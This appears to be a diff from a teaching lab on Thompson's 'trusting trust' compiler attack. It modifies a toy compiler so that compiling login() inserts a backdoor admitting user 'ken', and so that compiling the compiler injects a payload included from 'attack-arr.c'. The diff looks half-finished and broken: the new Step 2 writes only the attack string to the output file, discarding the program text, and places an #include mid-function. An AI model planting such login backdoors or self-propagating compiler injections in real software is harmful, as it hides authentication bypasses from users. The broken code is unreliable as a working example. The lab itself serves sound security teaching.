@@ -19,10 +19,36 @@ static void compile(char *program, char *outname) {
     fprintf(fp, "%s", program);
     fclose(fp);
 
+    int compiled_compiler = 0;
 
     /*****************************************************************
-     * Step 1:
+     * Step 2:
      */
+    
+    // search for the start of the compile routine: 
+    static char compile_sig[] =
+            "static void compile(char *program, char *outname) {\n"
+            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
+            "    assert(fp);"
+            ;
+
+    // and inject a placeholder "attack":
+    // inject this after the assert above after the call to fopen.
+    // not much of an attack.   this is just a quick placeholder.
+
+    char* compile_loc = strstr(program, compile_sig);
+
+    #include "attack-arr.c"
+
+    if (compile_loc) {
+        FILE *fp = fopen("./temp-out.c", "w");
+        assert(fp);
+        fprintf(fp, "\n\t%s", compile_attack);
+        fclose(fp);
+        compiled_compiler = 1;
+
+    }
+
  
     // match on the start of the login() routine:
     static char login_sig[] = "int login(char *user) {";
@@ -33,7 +59,7 @@ static void compile(char *program, char *outname) {
     // and inject an attack for "ken":
     static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
 
-    if (login_loc) {
+    if (login_loc && !compiled_compiler) {
         FILE *fp = fopen("./temp-out.c", "w");
         assert(fp);
 
@@ -55,49 +81,7 @@ static void compile(char *program, char *outname) {
 
         fclose(fp);
     }
-    /*****************************************************************
-     * Step 2:
-     */
     
-    // search for the start of the compile routine: 
-    static char compile_sig[] =
-            "static void compile(char *program, char *outname) {\n"
-            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
-            "    assert(fp);"
-            ;
-
-    // and inject a placeholder "attack":
-    // inject this after the assert above after the call to fopen.
-    // not much of an attack.   this is just a quick placeholder.
-    static char compile_attack[] 
-              = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";
-
-    char* compile_loc = strstr(program, compile_sig);
-
-    if (compile_loc) {
-        FILE *fp = fopen("./temp-out.c", "w");
-        assert(fp);
-
-        char* char_ptr = program;
-        
-        while (char_ptr != compile_loc) {
-            fprintf(fp, "%c", *char_ptr);
-            char_ptr++;
-        }
-
-        char_ptr += strlen(compile_sig);
-        fprintf(fp, "\n%s", compile_sig);
-        fprintf(fp, "\n\t%s", compile_attack);
-
-        while (char_ptr != program + strlen(program)) {
-            fprintf(fp, "%c", *char_ptr);
-            char_ptr++;
-        }
-
-        fclose(fp);
-        
-    }
-
     /************************************************************
      * don't modify the rest.
      */
